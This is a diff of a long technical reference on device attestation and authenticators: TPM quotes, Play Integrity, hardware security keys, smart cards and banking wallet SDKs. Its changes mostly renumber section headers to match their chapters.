 4. **Verify PCR values** — compare the `pcrDigest` against **expected ("golden") PCR measurements**. The verifier maintains a database of known-good PCR configurations for approved firmware versions, bootloader versions, and OS builds. If the PCR values match, the device's boot chain is unmodified
 5. **Validate against the event log** — the device provides a **TCG Event Log** alongside the quote — a sequential record of every measurement extended into each PCR. The verifier replays the event log (re-computing `PCR_new = SHA-256(PCR_old || measurement)` for each entry) to confirm the event log produces the quoted PCR values. This replay ensures the event log is consistent with the PCRs and allows the verifier to identify exactly which software components were loaded
 
-##### 17.3.1.1 TCG Event Log Format
+##### 18.3.1.1 TCG Event Log Format
 
 The TPM event log records every measurement event that extends a PCR. Understanding its format is essential for reconstructing the expected PCR values and comparing them against the quoted values (TCG TPM 2.0 Specification, Part 2).
 
@@ -21308,7 +21310,7 @@ TCG_PCR_EVENT2 \{
 
 To verify a TPM quote against the event log, the verifier must: (1) reconstruct the expected PCR values by replaying the event log — computing $\text{PCR}_i = H(\text{PCR}_i \,\|\, \text{digest})$ for each event targeting PCR $i$; (2) compute the composite digest over the selected PCRs using the formula from §18.3.1; (3) compare the recomputed digest against the `pcrDigest` in the quote; and (4) verify the AIK's signature over the `TPMS_ATTEST` structure.
 
-##### 17.3.1.2 PCR Replay Attack Taxonomy
+##### 18.3.1.2 PCR Replay Attack Taxonomy
 
 PCR replay attacks attempt to present a platform state that was valid at some point in the past but is no longer current (ISO/IEC 11889). The following taxonomy classifies the known attack vectors and their mitigations:
 
@@ -21323,7 +21325,7 @@ PCR replay attacks attempt to present a platform state that was valid at some po
 
 Defence in depth strategies: request all security-relevant PCRs (typically PCRs 0–7 for firmware/UEFI and PCRs 8–15 for OS boot loader and OS components); validate against a reference database of known-good PCR values for approved OS/firmware combinations; check `clockInfo` (TPM clock, reset count, restart count) for consistency with the claimed boot sequence; and cross-correlate with network telemetry (the claimed firmware version should be consistent with observed TLS fingerprints and HTTP User-Agent strings).
 
-##### 17.3.2 Key Attestation: TPM2_Certify
+##### 18.3.2 Key Attestation: TPM2_Certify
 
 TPM key attestation proves that a specific key was generated inside the TPM and has particular properties (non-exportable, hardware-generated, bound to a specific parent key).
 
@@ -21346,7 +21348,7 @@ The TPM produces a `TPMS_ATTEST` structure with `type = TPM_ST_ATTEST_CERTIFY` c
 
 **RP verification:** After validating the AK signature, the RP checks that the attested key's properties include `fixedTPM`, `fixedParent`, and `sensitiveDataOrigin` — confirming the key is truly hardware-bound and was generated inside the TPM (not imported from software).
 
-##### 17.3.3 Endorsement Key (EK) Certificate Chain
+##### 18.3.3 Endorsement Key (EK) Certificate Chain
 
 Every TPM contains a unique **Endorsement Key (EK)** — an asymmetric key pair provisioned by the TPM manufacturer during fabrication. The EK certificate is signed by the manufacturer's CA, creating a certificate chain that establishes the TPM's authenticity:
 
@@ -21396,7 +21398,7 @@ The EK is a globally unique, hardware-bound identifier — it never changes for 
 
 The standard mitigation is the **Privacy CA** model: the TPM generates a new AIK for each service interaction, the AIK is certified by a Privacy CA (which verifies the EK but does not disclose it), and the verifier trusts the AIK certificate — which contains no EK information — rather than the EK itself (ISO/IEC 11889).
 
-##### 17.3.4 Privacy-Preserving Attestation
+##### 18.3.4 Privacy-Preserving Attestation
 
 Standard TPM attestation using the EK or a directly certified AK reveals a persistent device identity to the verifier — the same EK certificate appears in every attestation, enabling cross-service tracking. The TCG specification provides two mechanisms to mitigate this privacy concern:
 
@@ -21464,7 +21466,7 @@ The simpler, more widely deployed approach: the TPM generates multiple Attestati
 
 The reality is that complete anonymisation of attestation is not achievable while maintaining meaningful security assurances. The practical approach is to minimise correlation to the degree that is operationally feasible — per-service AIKs with a trusted Privacy CA provide the best balance of privacy and deployability for most enterprise use cases (ISO/IEC 11889).
 
-##### 17.3.4.1 AIK Certificate Lifecycle
+##### 18.3.4.1 AIK Certificate Lifecycle
 
 Attestation Identity Keys follow a defined lifecycle from creation through revocation (ISO/IEC 11889):
 
@@ -21477,7 +21479,7 @@ Attestation Identity Keys follow a defined lifecycle from creation through revoc
 | **Rotation** | Generate a new AIK, deprecate the old one | `TPM2_Create` (new AIK) | Old AIK can be evicted from TPM memory; no credential transfer needed. Recommended every 90 days |
 | **Revocation** | Invalidate an AIK if the TPM is compromised | Admin action + CA publication | Privacy CA publishes revocation; verifiers check CRL. Rotating the AIK does not require re-provisioning the EK |
 
-##### 17.3.4.2 AIK Rotation Strategies
+##### 18.3.4.2 AIK Rotation Strategies
 
 To limit cross-service correlation, AIKs should be rotated according to the following strategy comparison:
 
@@ -21490,7 +21492,7 @@ To limit cross-service correlation, AIKs should be rotated according to the foll
 
 **Recommendation:** use **per-service AIKs** as the default. This provides strong privacy protection without the latency overhead of per-session rotation. Per-period rotation should be used as a minimum — a static AIK that never changes provides no privacy benefit against a colluding verifier and Privacy CA.
 
-##### 17.3.5 Enterprise Platform Attestation
+##### 18.3.5 Enterprise Platform Attestation
 
 TPM-based platform attestation is a cornerstone of enterprise device health assessment. Major enterprise endpoint management platforms consume TPM attestation to make conditional access decisions:
 
@@ -21532,7 +21534,7 @@ Similar patterns exist in other enterprise platforms — Workspace ONE evaluates
 #### 18.4 Device-Bound Keys and Hardware-Backed Credentials
 Device-bound keys — keys where the hardware guarantees non-exportability — are the strongest form of credential binding available on consumer and enterprise devices. This section synthesises the hardware-backed key properties from §15.2 with the attestation mechanisms from §18.1–§18.3 and the WebAuthn attestation ceremonies from §14.4.
 
-##### 17.4.1 Device-Bound Key Property Summary
+##### 18.4.1 Device-Bound Key Property Summary
 
 A key is **device-bound** when the underlying hardware enforces that the private key material cannot leave the security boundary:
 
@@ -21546,7 +21548,7 @@ A key is **device-bound** when the underlying hardware enforces that the private
 
 **The fundamental insight:** without attestation, the server must trust the client's claim that a key is hardware-backed. A compromised or emulated device could generate a software key and claim it was generated in hardware. Attestation provides the cryptographic proof that the claim is true — the attestation certificate chain, signed by the hardware manufacturer's root CA, vouches for the key's hardware provenance.
 
-##### 17.4.2 Key Lifecycle for Device-Bound Credentials
+##### 18.4.2 Key Lifecycle for Device-Bound Credentials
 
 Device-bound credentials follow a lifecycle that mirrors the device's own lifecycle — because the key cannot be exported, events affecting the device directly affect the credential:
 
@@ -21586,7 +21588,7 @@ Rotation triggers include: hardware security advisory (TEE vulnerability requiri
 #### 18.5 Device Trust Signals: Integrity Verdicts and Play Integrity
 Attestation (§18.1–§18.3) answers the question "was this key generated in genuine hardware?" Device trust signals answer a broader question: **"is this device trustworthy right now?"** — encompassing software integrity, jailbreak/root status, app binary authenticity, and compliance with enterprise security policies. Identity providers consume these signals to make **adaptive authentication decisions** (§25).
 
-##### 17.5.1 Google Play Integrity API
+##### 18.5.1 Google Play Integrity API
 
 The Google Play Integrity API (successor to the deprecated SafetyNet Attestation API, which was fully shut down in January 2025) provides a multi-dimensional integrity verdict for Android devices. The API evaluates the device, the app, and the Google Play licensing status in a single response.
 
@@ -21642,7 +21644,7 @@ The Google Play Integrity API (successor to the deprecated SafetyNet Attestation
 | `UNLICENSED` | User does not have a valid license — sideloaded, pirated, or account mismatch |
 | `UNEVALUATED` | Licensing status could not be determined |
 
-##### 17.5.2 Request Types: Standard vs. Classic
+##### 18.5.2 Request Types: Standard vs. Classic
 
 The Play Integrity API supports two request modes, offering a tradeoff between latency, freshness, and attack resistance:
 
@@ -21666,7 +21668,7 @@ The Play Integrity API supports two request modes, offering a tradeoff between l
 
 **Nonce binding best practices:** The Play Integrity API requires a server-provided nonce (minimum 16 bytes, recommended 32 bytes). Best practice: bind the nonce to the specific request context using `nonce = SHA-256(session_id || action || timestamp)` — this prevents a valid integrity token from being reused for a different action.
 
-##### 17.5.3 Apple Device Trust: Composite Approach
+##### 18.5.3 Apple Device Trust: Composite Approach
 
 Apple does not expose a single "device integrity API" equivalent to Google's Play Integrity. Instead, Apple's device trust model is distributed across multiple mechanisms:
 
@@ -21679,7 +21681,7 @@ Apple does not expose a single "device integrity API" equivalent to Google's Pla
 
 Apple's approach is more privacy-preserving — there is no server-side API that returns a device integrity "score." Instead, the attestation is binary (valid or invalid) and bound to the specific app, preventing cross-app device fingerprinting. The tradeoff is less granularity — an RP cannot distinguish between "device is genuine but has an outdated OS" and "device is genuine and fully patched" using App Attest alone.
 
-##### 17.5.4 Enterprise Device Management Signals
+##### 18.5.4 Enterprise Device Management Signals
 
 Beyond platform-level integrity APIs, enterprise identity providers aggregate device trust signals from Mobile Device Management (MDM) platforms to make conditional access decisions:
 
@@ -21705,7 +21707,7 @@ Beyond platform-level integrity APIs, enterprise identity providers aggregate de
 
 Device compliance signals are evaluated as conditions in Conditional Access policies. The policy can require a compliant device for access to sensitive applications while allowing non-compliant devices (with limited functionality) for low-risk resources. When a device loses compliance status mid-session, Continuous Access Evaluation (§39) can revoke or downgrade the session in near-real-time rather than waiting for token expiry.
 
-##### 17.5.5 Trust Signal Aggregation in Identity Providers
+##### 18.5.5 Trust Signal Aggregation in Identity Providers
 
 Identity providers (IdPs) consume device trust signals from multiple sources and combine them into an aggregate trust decision. This aggregation is where attestation (§18.1–§18.3) meets adaptive authentication (§25):
 
@@ -21728,7 +21730,7 @@ Google's zero-trust access platform uses Chrome Verified Access (TPM-backed devi
 #### 18.6 OTP Token Device Considerations
 While FIDO2/WebAuthn and platform authenticators are the forward-looking standard for device-bound authentication (§14, §18), a significant installed base of hardware and software OTP tokens remains in production — particularly in financial services, where EMV CAP/DPA readers and OCRA-based transaction signing tokens are mandated by banking regulations (PSD2 Strong Customer Authentication, §6.4). This section covers device lifecycle considerations for OTP token deployments that are relevant to the device attestation chapter's scope of hardware-bound credentials.
 
-##### 17.10.1 Migration Paths from Legacy OTP Algorithms
+##### 18.6.1 Migration Paths from Legacy OTP Algorithms
 
 Organisations currently using HOTP or TOTP that require transaction signing capabilities have several migration options (RFC 6287, §10):
 
@@ -21741,7 +21743,7 @@ Organisations currently using HOTP or TOTP that require transaction signing capa
 
 The shared key $K$ used in HOTP or TOTP can typically be reused in an OCRA deployment without re-provisioning, since all three algorithms use the same HMAC-based cryptographic pipeline with the same key format. The difference is purely in how the DataInput is constructed before the HMAC computation. However, migrating to WebAuthn/FIDO2 requires entirely new key material and a new authenticator form factor — there is no key reuse path from OTP algorithms to asymmetric WebAuthn credentials.
 
-##### 17.10.2 Client-Side Implementation: Hardware vs. Software Tokens
+##### 18.6.2 Client-Side Implementation: Hardware vs. Software Tokens
 
 **Hardware tokens** implement OTP algorithms in firmware with form-factor constraints that directly affect security properties and user experience:
 
@@ -21766,7 +21768,7 @@ The shared key $K$ used in HOTP or TOTP can typically be reused in an OCRA deplo
 
 The key tradeoff: hardware tokens offer superior key protection (EMV secure element, no network attack surface) but limited UX (manual challenge entry, small display). Software tokens offer rich UX (push notifications, transaction display, biometric unlock) but the key protection depends on the mobile device's security posture — which is itself subject to the attestation and device trust considerations discussed throughout this chapter (§18.1–§18.5).
 
-##### 17.10.3 Key Management for OTP Tokens
+##### 18.6.3 Key Management for OTP Tokens
 
 Key management for OTP tokens follows the same principles as attestation key lifecycle management (§18.4) but with OTP-specific operational considerations:
 
@@ -22060,7 +22062,7 @@ Attestation is not a certificate-chain-only problem. Backend verifiers must bind
 ::::
 
 #### 19.1 Attestation Revocation and Compromise Response
-##### 17.6.1 Revocation Mechanisms by Ecosystem
+##### 19.1.1 Revocation Mechanisms by Ecosystem
 
 Each attestation ecosystem handles revocation differently. The following table summarises the mechanisms, scope, distribution, and latency across the major ecosystems:
 
@@ -22114,7 +22116,7 @@ flowchart LR
     style Action text-align:left
 ```
 
-##### 17.6.2 Certificate Transparency for Attestation
+##### 19.1.2 Certificate Transparency for Attestation
 
 Certificate Transparency (CT) logs provide a public, append-only record of issued certificates. Applying CT to attestation certificates offers detection of unauthorised issuance and auditability. However, attestation-specific challenges exist:
 
@@ -22122,7 +22124,7 @@ Certificate Transparency (CT) logs provide a public, append-only record of issue
 - **Volume** — Android devices alone generate millions of attestation certificates per day. Standard CT logs are not designed for this volume
 - **Short-lived certificates** — attestation certificates issued via RKP may have validity periods of hours, making CT log monitoring impractical
 
-##### 17.6.3 Compromise Response Procedures
+##### 19.1.3 Compromise Response Procedures
 
 When an attestation key or device is compromised, RPs should follow a structured response:
 
@@ -22133,7 +22135,7 @@ When an attestation key or device is compromised, RPs should follow a structured
 5. **Credential rotation** — if the compromised key is used for device-bound credentials (WebAuthn passkeys), initiate credential recovery flows for affected users
 6. **Post-incident review** — analyse the root cause and update attestation policies to prevent recurrence
 
-##### 17.6.4 Blast Radius Analysis
+##### 19.1.4 Blast Radius Analysis
 
 The blast radius of an attestation compromise depends on the type and scope:
 
@@ -22211,7 +22213,7 @@ flowchart TD
 | **Primary deployment** | Mobile devices (phones, tablets) | Apple ecosystem (iPhone, iPad, Mac, Apple Watch) | PCs, laptops, servers, enterprise endpoints |
 
 #### 19.3 Verification Anti-Patterns and Architecture Recommendations
-##### 17.8.1 Common Implementation Mistakes
+##### 19.3.1 Common Implementation Mistakes
 
 The following table catalogues frequently observed mistakes in attestation verification implementations (NIST SP 800-147B):
 
@@ -22275,7 +22277,7 @@ flowchart TD
     style Safe text-align:left
 ```
 
-##### 17.8.2 Production Verification Architecture
+##### 19.3.2 Production Verification Architecture
 
 A production attestation verification service should follow these architectural recommendations:
 
@@ -22286,7 +22288,7 @@ A production attestation verification service should follow these architectural 
 5. **Support graceful degradation** — if the attestation service is unavailable, fall back to a reduced-assurance mode rather than failing closed (unless policy requires fail-closed). This prevents a single point of failure from locking out all users
 
 #### 19.4 Emerging Trends: Post-Quantum and Unified Frameworks
-##### 17.9.1 Post-Quantum Attestation
+##### 19.4.1 Post-Quantum Attestation
 
 With the advancement of quantum computing, attestation mechanisms face two distinct threats: **store-and-break** (an adversary records attestation signatures today and forges new ones after a quantum computer can break the underlying algorithm) and **retroactive key extraction** (if a quantum computer can solve ECDLP, the adversary can derive private attestation keys from public certificates).
 
@@ -22350,7 +22352,7 @@ Challenges specific to post-quantum attestation (NIST SP 800-208):
 - **TPM firmware updates** — TPM chips have limited flash storage; post-quantum algorithms may not fit in existing TPM firmware without major hardware redesign
 - **Performance** — Post-quantum signature verification is 10–100× slower than ECDSA, which may impact latency-sensitive attestation flows
 
-##### 17.9.2 Unified Attestation Frameworks
+##### 19.4.2 Unified Attestation Frameworks
 
 Several industry efforts aim to provide a unified attestation API across platforms:
 
@@ -22370,7 +22372,7 @@ $$
 
 where UDS is the Unique Device Secret (burned into ROM) and each CDI (Compound Device Identity) is derived by measuring the next layer of firmware or software (TCG DICE Specification).
 
-##### 17.9.3 Delegated Attestation/Attestation-as-a-Service
+##### 19.4.3 Delegated Attestation/Attestation-as-a-Service
 
 Cloud providers are beginning to offer attestation verification as a managed service, abstracting away the complexity of maintaining root certificate stores, verifying certificate chains, and replaying event logs:
 
@@ -22380,7 +22382,7 @@ Cloud providers are beginning to offer attestation verification as a managed ser
 
 These services introduce a dependency on the cloud provider's attestation infrastructure, creating a new trust anchor. The tradeoff is reduced operational complexity (no root certificate management, no CRL distribution) in exchange for a single point of trust that may not be acceptable for all regulatory environments. Organisations in regulated sectors should evaluate whether delegating attestation verification to a cloud provider meets their compliance requirements before adoption.
 
-##### 17.9.4 Emerging Authentication Modalities
+##### 19.4.4 Emerging Authentication Modalities
 
 Several proximity-based and tap-to-authenticate technologies may further expand device authentication capabilities in the 2027–2030 timeframe, with implications for how attestation and device trust are established:
 
@@ -22442,7 +22444,7 @@ flowchart TD
 #### 20.1 Software Authenticators
 Software authenticators are applications running on a user's smartphone or computer that generate or approve authentication challenges. They are the most widely deployed second-factor mechanism due to zero marginal cost and instant provisioning — any user with a smartphone can enroll within seconds by scanning a QR code.
 
-##### 19.1.1 TOTP-Based Authenticators
+##### 20.1.1 TOTP-Based Authenticators
 
 TOTP-based authenticators implement RFC 6238 (§12) — generating time-based one-time passwords from a shared secret provisioned via the `otpauth://` URI (§11.2.2, §12.5). The authenticator stores the shared secret in the device's software keychain and computes a new 6- or 8-digit code every 30 seconds.
 
@@ -22489,7 +22491,7 @@ Google Authenticator and Microsoft Authenticator only support HMAC-SHA1 for TOTP
 
 The critical distinction is whether the backup provider has access to the plaintext secrets. **Knowledge-of-secret providers** (Google, Microsoft, Authy) store encrypted TOTP secrets but control the encryption key — a compromise of the provider's infrastructure or the user's cloud account exposes all secrets. **Zero-knowledge providers** (1Password, Bitwarden) encrypt secrets with a key derived from the user's master password — the provider cannot decrypt the vault, even under legal compulsion.
 
-##### 19.1.2 Push-Based Authenticators
+##### 20.1.2 Push-Based Authenticators
 
 Push-based authenticators replace the manual code-entry workflow with an approval-based flow: the identity provider sends a push notification to the user's enrolled device, the user reviews the authentication request and taps "Approve" (or enters a matching number), and the approval signal is transmitted back to the IdP.
 
@@ -22741,7 +22743,7 @@ Additional defence mechanisms beyond number matching:
 
 Number matching alone reduces MFA fatigue success rate by an estimated 95%+. The additional mechanisms above provide defence-in-depth for high-security environments.
 
-##### 19.1.3 Software Passkey Providers
+##### 20.1.3 Software Passkey Providers
 
 Software passkey providers store FIDO2/WebAuthn credentials (§14.7) in software-backed vaults rather than in hardware security modules. The private key is generated in software, encrypted, and synchronised across the user's devices via the provider's encrypted sync fabric.
 
@@ -22840,7 +22842,7 @@ flowchart TD
     style BLE1 text-align:left
 ```
 
-##### 19.2.1 YubiKey (Yubico)
+##### 20.2.1 YubiKey (Yubico)
 
 The YubiKey is the dominant hardware security key in enterprise and consumer deployments. Its distinguishing feature is **multi-protocol support** — a single YubiKey device supports six distinct authentication protocols, enabling it to serve as a universal authenticator across modern and legacy systems.
 
@@ -22902,7 +22904,7 @@ Yubico offers the **YubiEnterprise Subscription** (YES) for organisations deploy
 
 **MDM integration — PIV certificate auto-enrollment:** Microsoft Intune can automate PIV certificate enrollment for YubiKey devices through a five-step workflow: (1) the user connects their YubiKey to their Windows/macOS device, and Intune detects the PIV card via the native smart card stack; (2) Intune generates a CSR (Certificate Signing Request) on behalf of the YubiKey's PIV slot 9A — the private key never leaves the YubiKey; (3) the CSR is submitted to the enterprise PKI (typically Microsoft AD CS or a third-party CA), which issues a certificate; (4) Intune loads the issued certificate into the YubiKey's PIV slot 9A via the Windows Smart Card resource manager or Yubico PIV tool; (5) the certificate's Subject Alternative Name (SAN) is mapped to the user's Active Directory object, enabling SSO to domain-joined resources. This automation reduces enrollment time from ~30 minutes (manual) to ~5 minutes per user.
 
-##### 19.2.2 Google Titan Security Key
+##### 20.2.2 Google Titan Security Key
 
 The Google Titan Security Key is a **purpose-built FIDO2 security key** — deliberately limited to a single protocol (FIDO2/WebAuthn + legacy U2F) with no support for PIV, OATH, OpenPGP, or proprietary OTP schemes. This single-purpose design reflects Google's philosophy that a security key should do one thing and do it well, minimising the attack surface.
 
@@ -22923,7 +22925,7 @@ The Google Titan Security Key is a **purpose-built FIDO2 security key** — deli
 
 **Google Advanced Protection Program (APP):** The Titan Key is a core component of Google's APP — the highest-security setting for Google Accounts, designed for journalists, political campaigns, and other high-risk users. APP requires FIDO2 security keys for all authentication and disables all non-FIDO authentication methods (SMS, TOTP, phone prompts), making the account immune to phishing, SIM swapping, and prompt bombing attacks.
 
-##### 19.2.3 SoloKeys (Solo V2)
+##### 20.2.3 SoloKeys (Solo V2)
 
 SoloKeys Solo V2 is an **open-source hardware security key** — both firmware and hardware designs are publicly available for community auditing, enabling independent verification of the key's security properties.
 
@@ -22945,7 +22947,7 @@ SoloKeys Solo V2 is an **open-source hardware security key** — both firmware a
 - Firmware reproducibility — users can build the firmware from source and compare it to the shipped binary
 - Supply-chain transparency — the full hardware bill of materials is public
 
-##### 19.2.4 Feitian BioPass FIDO2
+##### 20.2.4 Feitian BioPass FIDO2
 
 Feitian's BioPass series are **FIDO2 security keys with integrated capacitive fingerprint sensors** — enabling on-device biometric user verification without relying on the host device's biometric system.
 
@@ -22960,7 +22962,7 @@ Feitian's BioPass series are **FIDO2 security keys with integrated capacitive fi
 
 Fingerprint data is stored within the key's embedded security chip and never transmitted to the host device. The on-device fingerprint verification satisfies the WebAuthn user verification (UV) requirement — the authenticator sets the `UV` flag in the authenticator data without involving the host OS's biometric subsystem. This architecture is valuable in shared-device environments (kiosks, shared workstations) where the host device's biometric enrollment cannot be trusted — the security key carries its own biometric identity.
 
-##### 19.2.5 Hardware Security Key Vendor Comparison
+##### 20.2.5 Hardware Security Key Vendor Comparison
 
 The hardware security key market has expanded beyond Yubico, with multiple vendors offering FIDO2-compatible devices at various price points and feature sets:
 
@@ -22989,7 +22991,7 @@ The hardware security key market has expanded beyond Yubico, with multiple vendo
 
 $$\text{FIDO L3} \approx \text{Common Criteria EAL4+} \approx \text{FIPS 140-3 Level 3 (physical)}$$
 
-##### 19.2.6 Hardware Token OTP Devices (RSA SecurID)
+##### 20.2.6 Hardware Token OTP Devices (RSA SecurID)
 
 Hardware OTP tokens are **standalone, dedicated devices** that generate one-time passwords without any connectivity to the user's other devices. The RSA SecurID token is the most widely deployed hardware OTP token in enterprise environments — a category that predates both FIDO2 and smartphone-based authenticators.
 
@@ -23029,7 +23031,7 @@ The user's passcode is the concatenation of their memorised PIN and the currentl
 
 Note that WebAuthn/FIDO2 is fundamentally incompatible with OTP integration — it uses public-key cryptography rather than shared secrets, and operates at a different protocol layer. HOTP and FIDO2/WebAuthn cannot share credentials; a user enrolling both has two independent second-factor credentials (see below).
 
-##### 19.2.7 HOTP and FIDO2/WebAuthn Coexistence Strategies
+##### 20.2.7 HOTP and FIDO2/WebAuthn Coexistence Strategies
 
 As organisations adopt FIDO2/WebAuthn passkeys for phishing-resistant authentication, HOTP tokens remain in service alongside them. A coexistence strategy is needed:
 
@@ -23051,7 +23053,7 @@ Smart cards are credit card-sized devices containing an embedded secure element 
 
 *Contactless interface (ISO 14443):* Operating at 13.56 MHz with two modulation types — Type A uses ASK 100% modulation with Miller/Manchester coding (used by MIFARE, PIV contactless, CAC), while Type B uses ASK 10% modulation with NRZ-L/BPSK coding (used by some national ID implementations). Both support data rates from 106 kbps up to 848 kbps with a typical operating range of 0–10 cm. Most modern PIV and CAC cards support both contact and contactless interfaces. The contactless interface enables tap-to-login scenarios but introduces additional attack vectors (relay attacks, eavesdropping).
 
-##### 19.3.1 PIV: Personal Identity Verification (FIPS 201/NIST SP 800-73)
+##### 20.3.1 PIV: Personal Identity Verification (FIPS 201/NIST SP 800-73)
 
 PIV is the US federal government standard for employee and contractor identity credentials. Defined by FIPS 201 (Personal Identity Verification of Federal Employees and Contractors) and NIST SP 800-73 (Interfaces for Personal Identity Verification), PIV specifies the data model, cryptographic operations, and interoperability requirements for identity cards used in federal systems.
 
@@ -23086,11 +23088,11 @@ A PIV card is a contact smart card (ISO 7816) containing:
 | **Retired Certificates (R1–R20)** | 0x5FC10D–0x5FC120 | Varies | No | Up to 20 archived certificates |
 | **Biometric Information Template** | 0x5FC10E | Match on-card | Conditional | On-card biometric comparison data |
 
-##### 19.3.2 PIV-I: PIV-Interoperable
+##### 20.3.2 PIV-I: PIV-Interoperable
 
 PIV-Interoperable (PIV-I) extends the PIV credential model to **non-federal organisations** — state/local governments, first responders, contractors operating at federal facilities, and critical infrastructure operators. PIV-I cards follow the same SP 800-73 interface specification and data model as federal PIV cards, enabling cross-organisation interoperability at federal facilities. The PKI trust chain for PIV-I cards is rooted in the Federal Bridge Certification Authority (FBCA) — enabling federal relying parties to validate PIV-I certificates through the same trust infrastructure used for federal PIV cards.
 
-##### 19.3.3 CAC: Common Access Card
+##### 20.3.3 CAC: Common Access Card
 
 The Common Access Card (CAC) is the US Department of Defense's implementation of PIV. The CAC is a multi-function credential combining:
 
@@ -23115,7 +23117,7 @@ Over 3.5 million active CAC cards are issued to DoD military personnel, civilian
 | **Issuance volume** | ~5M cards | ~3.5M+ active cards |
 | **Contactless** | ISO 14443 (optional) | ISO 14443 (mandatory on newer cards) |
 
-##### 19.3.4 eIDAS Qualified Electronic Signature Creation Devices (QSCD)
+##### 20.3.4 eIDAS Qualified Electronic Signature Creation Devices (QSCD)
 
 Under the EU's eIDAS Regulation (Regulation (EU) No 910/2014), smart cards certified under Common Criteria (§15.3.2) can serve as **Qualified Signature Creation Devices (QSCDs)** — the hardware required to create **qualified electronic signatures (QES)** that carry the same legal effect as handwritten signatures across all EU member states.
 
@@ -23137,7 +23139,7 @@ Common QSCD implementations include smart cards from vendors such as Gemalto (no
 | **Custom smart card with CC evaluation** | Yes | SOG-IS CC EAL4+ augmented | Qualified electronic signatures |
 | **Cloud HSM-backed signing** | Conditional | Common Criteria or FIPS 140-3 for the HSM | Remote QSCD if qualified trust service provides it |
 
-##### 19.3.5 Smart Card Operating Systems
+##### 20.3.5 Smart Card Operating Systems
 
 Smart card operating systems provide the runtime environment for cryptographic applications (applets) running on the card's secure element:
 
@@ -23166,7 +23168,7 @@ Smart card operating systems provide the runtime environment for cryptographic a
 | **AES** | 128, 192, 256 | N/A | CBC, ECB, GCM, CCM | N/A |
 | **SHA** | N/A | N/A | N/A | N/A |
 
-##### 19.3.6 GlobalPlatform Card Management
+##### 20.3.6 GlobalPlatform Card Management
 
 GlobalPlatform is the industry standard for managing applications on smart cards — defining secure messaging, applet lifecycle management, and card lifecycle states.
 
@@ -23192,7 +23194,7 @@ where KDF is typically AES-CMAC-based key derivation as specified in NIST SP 800
 | **CARD_LOCKED** | Unblock only (with issuer keys) | Locked due to failed auth |
 | **TERMINATED** | No operations allowed | End-of-life |
 
-##### 19.3.7 Smart Card vs. Security Key
+##### 20.3.7 Smart Card vs. Security Key
 
 The boundary between smart cards and security keys has blurred — particularly because the YubiKey supports both paradigms on a single device. The fundamental distinction remains:
 
@@ -23384,7 +23386,7 @@ flowchart TD
 #### 20.12 Enterprise Hardware Token Lifecycle
 DR-0003's §20 covers the token form factor taxonomy — the classification of authenticators by physical form (USB security key, NFC smart card, BLE token, platform authenticator). This section covers the operational lifecycle of hardware tokens in enterprise deployments: procurement, provisioning, usage, rotation, and decommissioning.
 
-##### 19.12.1 Procurement and Vendor Selection
+##### 20.12.1 Procurement and Vendor Selection
 
 Enterprise hardware token procurement involves evaluating multiple factors:
 
@@ -23406,7 +23408,7 @@ Common enterprise selections:
 | Government / military | YubiKey 5 NFC + PIV | $45–55 |
 | Cost-sensitive / bulk | Feitian ePass FIDO2 | $15–25 |
 
-##### 19.12.2 Provisioning and Enrollment
+##### 20.12.2 Provisioning and Enrollment
 
 Hardware token provisioning in the enterprise typically follows this flow:
 
@@ -23416,7 +23418,7 @@ Hardware token provisioning in the enterprise typically follows this flow:
 4. **Enrollment.** The user registers the token with each required service: Entra ID, Okta, VPN, GitHub, etc. This is often facilitated by an enrollment portal that auto-registers the token with multiple services in a single flow.
 5. **Backup registration.** The user registers a backup token or recovery code (in case the primary token is lost).
 
-##### 19.12.3 Rotation, Loss, and Decommissioning
+##### 20.12.3 Rotation, Loss, and Decommissioning
 
 **Token rotation.** Hardware tokens should be rotated on a schedule (typically every 3–5 years) or when:
 - The token's firmware has a known vulnerability (check CVE databases).
@@ -23515,7 +23517,7 @@ The EBA Opinion on SCA (EBA/Op/2018/09) explicitly states that SMS OTP alone doe
 Key PSD2 RTS articles relevant to wallet SDKs include: Article 4 (SCA exemptions for low-value payments and trusted beneficiaries), Article 7 (exemptions based on risk analysis), Article 8 (dynamic linking of SCA to specific transaction amount and payee), and Articles 11–13 (authentication code generation, per-transaction SCA, and risk-based exemption conditions). National regulators add further requirements: BaFin (Germany) expects MFA for all high-value transactions regardless of amount; DNB (Netherlands) requires evidence of device attestation integrity; ACPR (France) and Banca d'Italia each publish interpretive guidance that may impose stricter requirements than the EU baseline.
 
 #### 21.1 Embedded Wallet Architecture
-##### 20.1.1 Definition and Scope
+##### 21.1.1 Definition and Scope
 
 A wallet SDK in the banking context is a software library (distributed as an XCFramework for iOS, an AAR for Android) that a bank integrates into its mobile application. The SDK manages:
 
@@ -23613,7 +23615,7 @@ flowchart TD
     style Attest text-align:left
 ```
 
-##### 20.1.2 Comparison with Platform-Native Approaches
+##### 21.1.2 Comparison with Platform-Native Approaches
 
 | Dimension | Platform-Native (WebAuthn/Passkeys — §14) | Embedded Wallet SDK |
 |:----------|:------------------------------------------|:-------------------|
@@ -23629,7 +23631,7 @@ flowchart TD
 
 The fundamental tradeoff: platform-native passkeys are **interoperable and low-maintenance** but offer limited lifecycle control; wallet SDKs are **proprietary and complex** but provide the operational granularity that banking regulators and risk teams demand.
 
-##### 20.1.3 Vendor Landscape
+##### 21.1.3 Vendor Landscape
 
 The embedded wallet SDK market is dominated by a small number of specialised security vendors, most of whom serve the financial services sector exclusively:
 
@@ -23647,7 +23649,7 @@ The embedded wallet SDK market is dominated by a small number of specialised sec
 
 These SDKs are **white-labelled** — the end user sees the bank's logo, colour scheme, and branded authentication screens. The SDK vendor's identity is invisible to the customer. The bank purchases a per-device or per-user licence and integrates the SDK into its build pipeline.
 
-##### 20.1.4 PSD2 Compliance and Certification
+##### 21.1.4 PSD2 Compliance and Certification
 
 PSD2 compliance is a table-stakes requirement for banking wallet SDKs operating in the European Economic Area. The following table compares each vendor's certifications (PSD2, Article 8):
 
@@ -23662,7 +23664,7 @@ PSD2 compliance is a table-stakes requirement for banking wallet SDKs operating 
 | SOC 2 Type II | Yes | Yes | Yes | Yes | Yes | Yes | Yes | No | Yes |
 | ISO 27001 | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes | Yes |
 
-##### 20.1.5 Vendor Pricing and Commercial Model
+##### 21.1.5 Vendor Pricing and Commercial Model
 
 Pricing structures vary significantly across vendors and impact total cost of ownership (TCO):
 
@@ -23708,7 +23710,7 @@ flowchart TD
     style L4 text-align:left
 ```
 
-##### 20.2.1 Layer 1: Device Binding (Possession Factor)
+##### 21.2.1 Layer 1: Device Binding (Possession Factor)
 
